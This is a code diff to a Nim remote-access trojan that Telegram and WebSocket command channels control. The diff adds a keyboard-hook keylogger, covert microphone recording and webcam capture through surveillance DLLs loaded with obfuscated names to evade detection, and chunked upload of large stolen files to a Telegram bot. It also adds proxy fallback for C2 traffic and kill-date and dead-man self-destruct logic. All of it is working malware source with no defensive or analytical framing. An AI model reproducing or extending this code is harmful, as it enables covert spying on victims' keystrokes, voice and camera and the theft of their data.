@@ -509,6 +509,19 @@ const
   S_DISCORD_CT    = encodeObf("Content-Type")
   S_DISCORD_JSONV = encodeObf("application/json")
 
+  # Surveillance DLL / proc names (dynamic load only - never in IAT)
+  S_WINMM         = encodeObf("winmm.dll")
+  S_AVICAP32      = encodeObf("avicap32.dll")
+  S_WINMM_OPEN    = encodeObf("waveInOpen")
+  S_WINMM_CLOSE   = encodeObf("waveInClose")
+  S_WINMM_PREPARE = encodeObf("waveInPrepareHeader")
+  S_WINMM_UNPREPARE = encodeObf("waveInUnprepareHeader")
+  S_WINMM_ADDBUF  = encodeObf("waveInAddBuffer")
+  S_WINMM_START   = encodeObf("waveInStart")
+  S_WINMM_STOP    = encodeObf("waveInStop")
+  S_WINMM_RESET   = encodeObf("waveInReset")
+  S_AVICAP_CREATE = encodeObf("capCreateCaptureWindowA")
+
 # Run a PowerShell script without any quoting pitfalls. -Command "..."
 # breaks the moment the script (or an embedded path) contains double
 # quotes; -EncodedCommand takes base64 UTF-16LE and is bulletproof.
@@ -684,7 +697,13 @@ let
   MutexName       = resolveMutex()
   RuntimeInstallDir  = getEnv("C2_INSTALL_DIR", InstallDir)
   RuntimeInstallName = getEnv("C2_INSTALL_NAME", InstallName)
-  ProxyUrl        = getEnv("TELEGRAM_PROXY", "")
+  ProxyUrl        = block:
+    var p = getEnv("TELEGRAM_PROXY", "")
+    if p.len == 0: p = getEnv("HTTPS_PROXY", "")
+    if p.len == 0: p = getEnv("HTTP_PROXY", "")
+    if p.len == 0: p = getEnv("https_proxy", "")
+    if p.len == 0: p = getEnv("http_proxy", "")
+    p
   PollBaseMs      = resolveIntEnv("C2_POLL_INTERVAL", 3000, 1000)
   PollHttpSec     = resolveIntEnv("C2_POLL_TIMEOUT", PollLongTimeout, 5)
   LogFilePath     = getEnv("C2_LOG_FILE", "")
@@ -721,6 +740,15 @@ agentLog("sentinel " & AgentVersion & " variant=" & VARIANT_NAME &
 # Telegram transport logging (silent unless C2_LOG_FILE is set).
 # This is the c2_tg / c2_both debug log, separate from the always-on
 # agentLog. We don't want every poll to touch the FS by default.
+proc winHttpProxyInfo(): tuple[accessType: DWORD, proxyName: string] =
+  if ProxyUrl.len == 0:
+    return (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, "")
+  var p = ProxyUrl
+  if p.startsWith("http://"): p = p[7..^1]
+  elif p.startsWith("https://"): p = p[8..^1]
+  p = p.strip(chars = {'/'})
+  if p.len == 0: return (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, "")
+  return (WINHTTP_ACCESS_TYPE_NAMED_PROXY, p)
 proc logMsg(msg: string) =
   if LogFilePath.len == 0: return
   try:
@@ -772,7 +800,7 @@ when defined(c2_ws) or defined(c2_both):
 
   proc encryptFrame(sc: SessionCrypto, plain: string): seq[byte] =
     var randBytes: array[8, byte]
-    for i in 0..<8: randBytes[i] = rand(255).byte
+    discard randomBytes(addr randBytes[0], 8)
     let nonce = makeNonce(sc.sendCtr, randBytes)
     inc sc.sendCtr
     let aad = makeAad(sc.agentId, AAD_DIR_A2S)
@@ -809,7 +837,9 @@ when defined(c2_ws) or defined(c2_both):
 # UTILITIES
 # =============================================================================
 proc randomToken(n: int = 4): string =
-  for _ in 0..<n: result.add(toHex(rand(255), 2))
+  var rb: array[32, byte]
+  discard randomBytes(addr rb[0], n)
+  for i in 0..<n: result.add(toHex(rb[i], 2))
 
 proc hexToBytes(s: string): seq[byte] =
   if s.len == 0 or (s.len mod 2) != 0: return @[]
@@ -963,8 +993,12 @@ when defined(c2_ws) or defined(c2_both):
 # AES-GCM meta because there's no session key derived from it - the
 # install state is just operational).
 when defined(c2_tg):
+  const TG_DEAD_MAN_SECS = 30 * 24 * 3600
   var tgMetaInstallKey: array[32, byte]
   var tgMetaLastContact: int64 = 0
+  var tgMetaKillDate: int64 = 0
+  var tgMetaSleepMin: int = 0
+  var tgSleepEpoch: int64 = 0        # unix seconds; 0 = awake
   let TG_META_FILE = META_DIR / META_FILE_NAME
 
   proc loadTgMeta() =
@@ -974,15 +1008,35 @@ when defined(c2_tg):
       if raw.len < 32: return
       let rawBytes = cast[seq[byte]](raw)
       for i in 0..<32: tgMetaInstallKey[i] = rawBytes[i]
+      if raw.len >= 40:
+        var lc: int64 = 0
+        for i in 0..<8: lc = lc or (int64(rawBytes[32+i]) shl (i*8))
+        tgMetaLastContact = lc
+      if raw.len >= 48:
+        var kd: int64 = 0
+        for i in 0..<8: kd = kd or (int64(rawBytes[40+i]) shl (i*8))
+        tgMetaKillDate = kd
+      if raw.len >= 52:
+        var sm: int = 0
+        for i in 0..<4: sm = sm or (int(rawBytes[48+i]) shl (i*8))
+        tgMetaSleepMin = sm
     except: discard
 
   proc saveTgMeta() =
     try:
       createDir(META_DIR)
-      var outp = newSeq[byte](32)
+      var outp = newSeq[byte](52)
       for i in 0..<32: outp[i] = tgMetaInstallKey[i]
+      for i in 0..<8: outp[32+i] = byte((tgMetaLastContact shr (i*8)) and 0xFF)
+      for i in 0..<8: outp[40+i] = byte((tgMetaKillDate shr (i*8)) and 0xFF)
+      for i in 0..<4: outp[48+i] = byte((tgMetaSleepMin shr (i*8)) and 0xFF)
       writeFile(TG_META_FILE, cast[string](outp))
     except: discard
+
+  proc tgIsKilled(): bool =
+    if tgMetaKillDate != 0 and getTime().toUnix() >= tgMetaKillDate: return true
+    if tgMetaLastContact != 0 and getTime().toUnix() - tgMetaLastContact > TG_DEAD_MAN_SECS: return true
+    return false
 
 # =============================================================================
 # Single-instance mutex
@@ -1327,8 +1381,9 @@ proc winHttpPostJson(host: string, port: int, path: string,
                      body: string, extraHeaders: string = ""): tuple[code: int, body: string] =
   result = (-1, "")
   let ua = newWideCString(UserAgent)
-  let hSession = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                              nil, nil, 0)
+  let (proxyAccess, proxyName) = winHttpProxyInfo()
+  let wProxy = newWideCString(proxyName)  # empty string OK: ignored unless NAMED_PROXY
+  let hSession = WinHttpOpen(ua, proxyAccess, wProxy, nil, 0)
   if hSession == nil: return
   defer: discard WinHttpCloseHandle(hSession)
   # Long-poll headroom: WinHTTP's default receive timeout is 30s which
@@ -1428,8 +1483,9 @@ proc winHttpPostMultipart(host: string, port: int, path: string,
   body.add("--" & boundary & "--" & crlf)
   # Now POST it
   let ua = newWideCString(UserAgent)
-  let hSession = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                              nil, nil, 0)
+  let (proxyAccess2, proxyName2) = winHttpProxyInfo()
+  let wProxy2 = newWideCString(proxyName2)
+  let hSession = WinHttpOpen(ua, proxyAccess2, wProxy2, nil, 0)
   if hSession == nil: return
   defer: discard WinHttpCloseHandle(hSession)
   # Large document uploads over slow links need more than the 30s
@@ -1587,6 +1643,45 @@ when defined(c2_tg) or defined(c2_both):
              $getFileSize(path) & " B)")
       sleep(800 * attempt)
     return code == 200
+
+  # Telegram Bot API hard limit: 50 MB per document. Files larger than
+  # that are split into <name>.partNNN pieces the operator can
+  # reassemble locally (copy /b a.part001+b.part002 out.zip).
+  proc tgSendDocumentChunked(path: string, caption: string = ""): bool =
+    const PART_LIMIT = 45 * 1024 * 1024  # 45 MB, safely under 50
+    let sz = getFileSize(path)
+    if sz <= PART_LIMIT:
+      return tgSendDocument(path, caption)
+    let total = (sz + PART_LIMIT - 1) div PART_LIMIT
+    discard tgSendText("[*] " & extractFilename(path) & " is " &
+                       $(sz div (1024*1024)) & " MB - sending in " &
+                       $total & " parts (reassemble with copy /b)")
+    var f: File
+    if not open(f, path, fmRead):
+      discard tgSendText("[!] cannot open for chunking: " & path)
+      return false
+    defer: f.close()
+    var buf = newSeq[byte](PART_LIMIT)
+    var partIdx = 0
+    var allOk = true
+    while not f.endOfFile:
+      let got = f.readBytes(buf, 0, PART_LIMIT)
+      if got == 0: break
+      inc partIdx
+      let partPath = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
+                     (extractFilename(path) & ".part" &
+                      align($partIdx, 3, '0'))
+      writeFile(partPath, cast[string](buf[0..<got]))
+      if not tgSendDocument(partPath,
+                            extractFilename(path) & ".part" &
+                            align($partIdx, 3, '0') & "/" & $total):
+        allOk = false
+        discard tgSendText("[!] part " & $partIdx & " failed - stopping")
+        try: removeFile(partPath) except: discard
+        break
+      try: removeFile(partPath) except: discard
+      sleep(1500)  # be gentle with the Bot API flood window
+    return allOk
 
 # WS path: telegram is out-of-band notification, same chunked path
 when defined(c2_ws):
@@ -2241,6 +2336,475 @@ when defined(c2_tg):
         try: removeFile(path) except: discard
         inc watchShotsTaken
 
+  # =================================================================
+  # ============  SURVEILLANCE: keys / mic / cam (TG)  ==============
+  # =================================================================
+  # Ported from agent.nim's WS-path implementations, adapted for the
+  # synchronous TG poll loop: captures land in %TEMP% files which the
+  # command handlers ship as Telegram documents.
+  when defined(windows):
+    const
+      SURV_CALLBACK_NULL* = 0x00000000
+      SURV_WAVE_FORMAT_PCM* = 0x0001
+      SURV_MMSYSERR_NOERROR* = 0
+      SURV_WHDR_DONE* = 0x00000001
+      SURV_MIC_MAX_SECS     = 120
+      SURV_MIC_SAMPLE_RATE  = 16000
+      SURV_MIC_CHANNELS     = 1
+      SURV_MIC_BITS         = 16
+      SURV_MIC_BUF_COUNT    = 4
+      SURV_MIC_BUF_MS       = 250
+    type
+      SW_HWAVEIN* = HANDLE
+      SW_LPHWAVEIN* = ptr SW_HWAVEIN
+      SW_MMRESULT* = UINT
+      SW_WAVEHDR* {.pure.} = object
+        lpData*: LPSTR
+        dwBufferLength*: DWORD
+        dwBytesRecorded*: DWORD
+        dwUser*: UINT
+        dwFlags*: DWORD
+        dwLoops*: DWORD
+        lpNext*: pointer
+        reserved*: UINT
+      SW_LPWAVEHDR* = ptr SW_WAVEHDR
+      SW_WAVEFORMATEX* {.pure, packed.} = object
+        wFormatTag*: WORD
+        nChannels*: WORD
+        nSamplesPerSec*: DWORD
+        nAvgBytesPerSec*: DWORD
+        nBlockAlign*: WORD
+        wBitsPerSample*: WORD
+        cbSize*: WORD
+      SW_LPWFX* = ptr SW_WAVEFORMATEX
+
+    let SW_WAVE_MAPPER* = UINT(-1)
+
+    type
+      TWaveInOpen          = proc(phwi: SW_LPHWAVEIN, uDeviceID: UINT,
+                                  pwfx: SW_LPWFX, dwCallback: UINT_PTR,
+                                  dwInstance: UINT_PTR, fdwOpen: DWORD): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInClose         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInPrepareHeader = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInUnprepareHeader = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInAddBuffer     = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInStart         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInStop          = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
+      TWaveInReset         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
+      TCapCreateCaptureWindowA = proc(lpszWindowName: cstring, dwStyle: DWORD,
+                                      x: int32, y: int32, nWidth: int32, nHeight: int32,
+                                      hwndParent: HWND, nID: int32): HWND {.stdcall, gcsafe.}
+
+    var
+      winmmHandle: HMODULE = 0
+      avicapHandle: HMODULE = 0
+      pWaveInOpen:          TWaveInOpen          = nil
+      pWaveInClose:         TWaveInClose         = nil
+      pWaveInPrepareHeader: TWaveInPrepareHeader = nil
+      pWaveInUnprepareHeader: TWaveInUnprepareHeader = nil
+      pWaveInAddBuffer:     TWaveInAddBuffer     = nil
+      pWaveInStart:         TWaveInStart         = nil
+      pWaveInStop:          TWaveInStop          = nil
+      pWaveInReset:         TWaveInReset         = nil
+      pCapCreate:           TCapCreateCaptureWindowA = nil
+      survLoadLock: Lock
+    initLock(survLoadLock)
+
+    proc loadWinmmOnce(): bool =
+      if pWaveInOpen != nil and pWaveInStart != nil: return true
+      withLock survLoadLock:
+        if winmmHandle == 0:
+          let dllName = obfStr(S_WINMM)
+          winmmHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
+          if winmmHandle == 0: return false
+        template resolve(p: typed, encBuf) =
+          if p == nil:
+            let fnName = obfStr(encBuf)
+            let gp = GetProcAddress(winmmHandle, cast[cstring](addr fnName[0]))
+            if gp == nil: return false
+            p = cast[typeof(p)](gp)
+        resolve(pWaveInOpen,          S_WINMM_OPEN)
+        resolve(pWaveInClose,         S_WINMM_CLOSE)
+        resolve(pWaveInPrepareHeader, S_WINMM_PREPARE)
+        resolve(pWaveInUnprepareHeader, S_WINMM_UNPREPARE)
+        resolve(pWaveInAddBuffer,     S_WINMM_ADDBUF)
+        resolve(pWaveInStart,         S_WINMM_START)
+        resolve(pWaveInStop,          S_WINMM_STOP)
+        resolve(pWaveInReset,         S_WINMM_RESET)
+        return true
+
+    proc loadAvicapOnce(): bool =
+      if pCapCreate != nil: return true
+      withLock survLoadLock:
+        if avicapHandle == 0:
+          let dllName = obfStr(S_AVICAP32)
+          avicapHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
+          if avicapHandle == 0: return false
+        if pCapCreate == nil:
+          let fnName = obfStr(S_AVICAP_CREATE)
+          let gp = GetProcAddress(avicapHandle, cast[cstring](addr fnName[0]))
+          if gp == nil: return false
+          pCapCreate = cast[TCapCreateCaptureWindowA](gp)
+        return true
+
+    # Thin wrappers so call sites keep winmm-style names.
+    proc waveInOpen(phwi: SW_LPHWAVEIN, uDeviceID: UINT,
+                    pwfx: SW_LPWFX, dwCallback: UINT_PTR,
+                    dwInstance: UINT_PTR, fdwOpen: DWORD): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInOpen(phwi, uDeviceID, pwfx, dwCallback, dwInstance, fdwOpen)
+    proc waveInClose(hwi: SW_HWAVEIN): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInClose(hwi)
+    proc waveInPrepareHeader(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInPrepareHeader(hwi, pwh, cbwh)
+    proc waveInUnprepareHeader(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInUnprepareHeader(hwi, pwh, cbwh)
+    proc waveInAddBuffer(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInAddBuffer(hwi, pwh, cbwh)
+    proc waveInStart(hwi: SW_HWAVEIN): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInStart(hwi)
+    proc waveInStop(hwi: SW_HWAVEIN): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInStop(hwi)
+    proc waveInReset(hwi: SW_HWAVEIN): SW_MMRESULT =
+      if not loadWinmmOnce(): return 1
+      pWaveInReset(hwi)
+    proc capCreateCaptureWindowA(lpszWindowName: cstring, dwStyle: DWORD,
+                                 x: int32, y: int32, nWidth: int32, nHeight: int32,
+                                 hwndParent: HWND, nID: int32): HWND =
+      if not loadAvicapOnce(): return 0
+      pCapCreate(lpszWindowName, dwStyle, x, y, nWidth, nHeight, hwndParent, nID)
+
+    # ---- KEYLOGGER ----
+    var
+      keylogBuffer = ""
+      keyloggerRunning = false
+      keylogHook: HHOOK = 0
+      keylogThreadVar: Thread[void]
+
+    proc vkToChar(vk: int32, shifted: bool): string =
+      if vk >= 0x30 and vk <= 0x39:
+        if shifted:
+          case vk
+          of 0x30: return ")"
+          of 0x31: return "!"
+          of 0x32: return "@"
+          of 0x33: return "#"
+          of 0x34: return "$"
+          of 0x35: return "%"
+          of 0x36: return "^"
+          of 0x37: return "&"
+          of 0x38: return "*"
+          of 0x39: return "("
+          else: discard
+        return $char(vk)
+      if vk >= 0x41 and vk <= 0x5A:
+        if shifted: return $char(vk)
+        return $char(vk + 0x20)
+      if vk == VK_SPACE: return " "
+      if vk == VK_RETURN: return "\n"
+      if vk == VK_TAB: return "\t"
+      if vk == VK_BACK: return "[BKSP]"
+      if vk == VK_ESCAPE: return "[ESC]"
+      if vk == VK_OEM_PERIOD: return "."
+      if vk == VK_OEM_COMMA: return ","
+      return ""
+
+    proc utf8SafeTruncate(s: var string, maxLen: int) =
+      if s.len <= maxLen: return
+      var i = maxLen
+      while i > 0 and (byte(s[i]) and 0xC0) == 0x80:
+        dec i
+      s = s[i .. ^1]
+
+    proc lowLevelKeyboardProc(nCode: int32, wParam: WPARAM,
+                              lParam: LPARAM): LRESULT {.stdcall.} =
+      if nCode == HC_ACTION and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
+        let p = cast[ptr KBDLLHOOKSTRUCT](lParam)
+        let vk = p.vkCode
+        let shifted = (GetAsyncKeyState(VK_SHIFT) and 0x8000'i16) != 0
+        let ch = vkToChar(vk, shifted)
+        if ch.len > 0:
+          keylogBuffer.add(ch)
+          if keylogBuffer.len > KEYLOG_BUFFER_MAX:
+            utf8SafeTruncate(keylogBuffer, KEYLOG_BUFFER_MAX div 2)
+      result = CallNextHookEx(0, nCode, wParam, lParam)
+
+    proc keyloggerThread() {.thread.} =
+      let hInst = GetModuleHandle(nil)
+      keylogHook = SetWindowsHookExW(WH_KEYBOARD_LL, lowLevelKeyboardProc,
+                                      hInst, 0)
+      var msg: MSG
+      while keyloggerRunning:
+        let r = GetMessageW(addr msg, 0, 0, 0)
+        if r <= 0: break
+        discard TranslateMessage(addr msg)
+        discard DispatchMessageW(addr msg)
+      if keylogHook != 0:
+        discard UnhookWindowsHookEx(keylogHook)
+        keylogHook = 0
+
+    proc keysDumpToFile(): string =
+      if keylogBuffer.len == 0: return ""
+      let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
+                 (BuildPrefix & "_keys_" & $(getTime().toUnix()) & ".txt")
+      writeFile(path, keylogBuffer)
+      keylogBuffer = ""
+      return path
+
+    proc cmdKeys(arg: string): string =
+      case arg.strip().toLowerAscii()
+      of "start":
+        if keyloggerRunning: return "keylogger already running"
+        keyloggerRunning = true
+        keylogBuffer = ""
+        try:
+          createThread(keylogThreadVar, keyloggerThread)
+        except CatchableError as e:
+          keyloggerRunning = false
+          return "err: " & e.msg
+        return "[+] keylogger running - /keys stop to dump"
+      of "stop":
+        if not keyloggerRunning: return "keylogger not running"
+        keyloggerRunning = false
+        sleep(300)  # let the hook thread see the flag + unhook
+        let path = keysDumpToFile()
+        if path.len == 0: return "stopped (no keystrokes captured)"
+        return "@file:" & path
+      of "dump":
+        if not keyloggerRunning: return "keylogger not running"
+        let path = keysDumpToFile()
+        if path.len == 0: return "no keystrokes yet"
+        return "@file:" & path
+      else:
+        return "usage: /keys start | /keys dump | /keys stop"
+
+    # ---- MIC (one-shot, synchronous) ----
+    proc buildSurvWavHeader(sampleRate, channels, bitsPerSample, pcmLen: int): seq[byte] =
+      let bytesPerSample = channels * (bitsPerSample div 8)
+      let bytesPerSec = sampleRate * bytesPerSample
+      proc putU32le(b: var seq[byte], v: int) =
+        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
+        b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
+      proc putU16le(b: var seq[byte], v: int) =
+        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
+      proc putTag(b: var seq[byte], tag: string) =
+        for ch in tag: b.add(byte(ch))
+      result = newSeqOfCap[byte](44)
+      putTag(result, "RIFF")
+      putU32le(result, 36 + pcmLen)
+      putTag(result, "WAVE")
+      putTag(result, "fmt ")
+      putU32le(result, 16)
+      putU16le(result, 1)
+      putU16le(result, channels)
+      putU32le(result, sampleRate)
+      putU32le(result, bytesPerSec)
+      putU16le(result, bytesPerSample)
+      putU16le(result, bitsPerSample)
+      putTag(result, "data")
+      putU32le(result, pcmLen)
+
+    proc captureMicSync(seconds: int): tuple[ok: bool, path, err: string] =
+      let secs = clamp(seconds, 1, SURV_MIC_MAX_SECS)
+      let sampleRate    = SURV_MIC_SAMPLE_RATE
+      let channels      = SURV_MIC_CHANNELS
+      let bitsPerSample = SURV_MIC_BITS
+      let bytesPerSample = channels * (bitsPerSample div 8)
+      let bytesPerSec    = sampleRate * bytesPerSample
+      let pcmSize        = sampleRate * secs * bytesPerSample
+      let bufSamples     = (sampleRate * SURV_MIC_BUF_MS) div 1000
+      let bufSize        = bufSamples * bytesPerSample
+
+      if not loadWinmmOnce():
+        return (false, "", "[!] mic: winmm.dll unavailable")
+
+      var fmt: SW_WAVEFORMATEX
+      fmt.wFormatTag       = WORD(SURV_WAVE_FORMAT_PCM)
+      fmt.nChannels        = WORD(channels)
+      fmt.nSamplesPerSec   = DWORD(sampleRate)
+      fmt.nAvgBytesPerSec  = DWORD(bytesPerSec)
+      fmt.nBlockAlign      = WORD(bytesPerSample)
+      fmt.wBitsPerSample   = WORD(bitsPerSample)
+      fmt.cbSize           = 0
+
+      var hwi: SW_HWAVEIN = 0
+      let rc = waveInOpen(addr hwi, SW_WAVE_MAPPER, addr fmt, 0, 0,
+                          DWORD(SURV_CALLBACK_NULL))
+      if rc != DWORD(SURV_MMSYSERR_NOERROR):
+        return (false, "", "[!] mic: waveInOpen failed rc=" & $rc &
+                " (no input device? in use?)")
+      if hwi == 0:
+        return (false, "", "[!] mic: waveInOpen returned null handle")
+
+      var hdrs: array[SURV_MIC_BUF_COUNT, SW_WAVEHDR]
+      var bufs: array[SURV_MIC_BUF_COUNT, seq[byte]]
+      var openOk = true
+      for i in 0..<SURV_MIC_BUF_COUNT:
+        bufs[i] = newSeq[byte](bufSize)
+        zeroMem(addr hdrs[i], sizeof(SW_WAVEHDR))
+        hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
+        hdrs[i].dwBufferLength = DWORD(bufSize)
+        let rcp = waveInPrepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+        if rcp != DWORD(SURV_MMSYSERR_NOERROR):
+          openOk = false
+          break
+        let rca = waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+        if rca != DWORD(SURV_MMSYSERR_NOERROR):
+          openOk = false
+          break
+      if not openOk:
+        for i in 0..<SURV_MIC_BUF_COUNT:
+          if bufs[i].len > 0:
+            discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+        discard waveInClose(hwi)
+        return (false, "", "[!] mic: setup failed")
+
+      let rcStart = waveInStart(hwi)
+      if rcStart != DWORD(SURV_MMSYSERR_NOERROR):
+        for i in 0..<SURV_MIC_BUF_COUNT:
+          discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+        discard waveInClose(hwi)
+        return (false, "", "[!] mic: waveInStart rc=" & $rcStart)
+
+      var pcm = newSeq[byte](pcmSize)
+      var pcmFilled = 0
+      var idleTicks = 0
+      const MAX_IDLE_TICKS = 100
+      while pcmFilled < pcmSize:
+        var anyDone = false
+        for i in 0..<SURV_MIC_BUF_COUNT:
+          if (hdrs[i].dwFlags and DWORD(SURV_WHDR_DONE)) != 0:
+            anyDone = true
+            let captured = int(hdrs[i].dwBytesRecorded)
+            if captured > 0 and pcmFilled < pcmSize:
+              let toCopy = min(captured, pcmSize - pcmFilled)
+              copyMem(addr pcm[pcmFilled], addr bufs[i][0], toCopy)
+              pcmFilled += toCopy
+            zeroMem(addr hdrs[i], sizeof(SW_WAVEHDR))
+            hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
+            hdrs[i].dwBufferLength = DWORD(bufSize)
+            discard waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+        if not anyDone:
+          inc idleTicks
+          if idleTicks > MAX_IDLE_TICKS: break
+        else:
+          idleTicks = 0
+        if pcmFilled < pcmSize:
+          sleep(20)
+
+      discard waveInStop(hwi)
+      discard waveInReset(hwi)
+      for i in 0..<SURV_MIC_BUF_COUNT:
+        discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
+      discard waveInClose(hwi)
+
+      if pcmFilled == 0:
+        return (false, "", "[!] mic: captured 0 bytes")
+      if pcmFilled < pcm.len:
+        pcm.setLen(pcmFilled)
+
+      var wav = buildSurvWavHeader(sampleRate, channels, bitsPerSample, pcm.len)
+      for b in pcm: wav.add(b)
+      let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
+                 (BuildPrefix & "_mic_" & $(getTime().toUnix()) & ".wav")
+      writeFile(path, cast[string](wav))
+      return (true, path, "")
+
+    # ---- CAM (single frame via VfW, synchronous) ----
+    proc captureCamSync(device: int): tuple[ok: bool, path, err: string] =
+      const
+        WM_CAP                   = WM_USER
+        WM_CAP_DRIVER_CONNECT    = WM_CAP + 10
+        WM_CAP_DRIVER_DISCONNECT = WM_CAP + 11
+        WM_CAP_EDIT_COPY         = WM_CAP + 30
+        WM_CAP_GRAB_FRAME        = WM_CAP + 60
+        DEVICE_MAX = 9
+      let devIdx = clamp(device, 0, DEVICE_MAX)
+
+      if not loadAvicapOnce():
+        return (false, "", "[!] cam: avicap32.dll unavailable")
+
+      let hwnd = capCreateCaptureWindowA("cam", DWORD(WS_OVERLAPPEDWINDOW),
+                                         0, 0, 320, 240, HWND(0), int32(0))
+      if hwnd == 0:
+        return (false, "", "[!] cam: capCreateCaptureWindowA failed")
+
+      var connected = false
+      try:
+        let con = SendMessageA(hwnd, WM_CAP_DRIVER_CONNECT, WPARAM(devIdx), 0)
+        if con == 0:
+          return (false, "", "[!] cam: no camera at device " & $devIdx &
+                  " (no webcam? in use by another app?)")
+        connected = true
+        discard SendMessageA(hwnd, WM_CAP_GRAB_FRAME, 0, 0)
+        let ed = SendMessageA(hwnd, WM_CAP_EDIT_COPY, 0, 0)
+        if ed == 0:
+          return (false, "", "[!] cam: WM_CAP_EDIT_COPY failed")
+
+        var opened = false
+        for i in 0..<10:
+          if OpenClipboard(0) != 0:
+            opened = true
+            break
+          sleep(50)
+        if not opened:
+          return (false, "", "[!] cam: OpenClipboard failed (busy)")
+        defer: CloseClipboard()
+
+        let hDib = GetClipboardData(CF_DIB)
+        if hDib == 0:
+          return (false, "", "[!] cam: no DIB in clipboard")
+
+        var bmi: BITMAPINFOHEADER
+        copyMem(addr bmi, cast[ptr byte](hDib), sizeof(BITMAPINFOHEADER))
+        let w = int(bmi.biWidth)
+        let h = int(abs(bmi.biHeight))
+        if w == 0 or h == 0:
+          return (false, "", "[!] cam: driver returned empty frame")
+        var pixelBytes = int(bmi.biSizeImage)
+        if pixelBytes == 0:
+          let bpp = int(bmi.biBitCount)
+          if bpp == 0:
+            return (false, "", "[!] cam: driver returned bpp=0")
+          pixelBytes = ((w * bpp + 31) div 32) * 4 * h
+        let compression = int(bmi.biCompression)
+        let extraHdr = if compression == 3: 12 else: 0
+        let actualDibSize = sizeof(BITMAPINFOHEADER) + pixelBytes + extraHdr
+        let fileSize = 14 + actualDibSize
+
+        var bmp = newSeqOfCap[byte](fileSize)
+        bmp.add(0x42); bmp.add(0x4D)
+        proc putU32(b: var seq[byte], v: int32) =
+          b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
+          b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
+        proc putU16(b: var seq[byte], v: int16) =
+          b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
+        putU32(bmp, int32(fileSize))
+        putU16(bmp, int16(0))
+        putU16(bmp, int16(0))
+        putU32(bmp, int32(14 + sizeof(BITMAPINFOHEADER) + extraHdr))
+        let src = cast[ptr UncheckedArray[byte]](hDib)
+        var copied = 0
+        while copied < actualDibSize:
+          let chunk = min(4096, actualDibSize - copied)
+          for j in 0..<chunk: bmp.add(byte(src[copied + j]))
+          inc copied, chunk
+
+        let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
+                   (BuildPrefix & "_cam_" & $(getTime().toUnix()) & ".bmp")
+        writeFile(path, cast[string](bmp))
+        return (true, path, $w & "x" & $h)
+      finally:
+        if connected:
+          discard SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+        DestroyWindow(hwnd)
+
 # =============================================================================
 # ==============  WS TRANSPORT LAYER (c2_ws / c2_both)  ====================
 # =============================================================================
@@ -2535,7 +3099,7 @@ when defined(c2_ws) or defined(c2_both):
     let payload = $info
     let ourNonce: array[16, byte] = block:
       var n: array[16, byte]
-      for i in 0..<16: n[i] = rand(255).byte
+      discard randomBytes(addr n[0], 16)
       n
     let anB64 = base64.encode(ourNonce)
     let hmacHexVal = hmacHex(agentSecret(), payload)
@@ -2726,17 +3290,24 @@ when defined(c2_tg):
       "/cleanup              remove all persistence (agent stays alive)\n" &
       "/watch [start N | count N [sec] | stop]   periodic screenshots\n" &
       "/selfdestruct         remove agent + all persistence + exit\n" &
-      "/sleep <seconds>      sleep for N seconds\n" &
+      "/sleep <seconds>      quiet mode N seconds (only /wake honored)\n" &
+      "/wake                 end quiet mode early\n" &
+      "/killdate <unix_ts>   self-destruct deadline (/killdate off clears)\n" &
       "/exit                 kill the agent (persistence stays)\n" &
       "/status               health check (uptime, persistence, last poll)\n" &
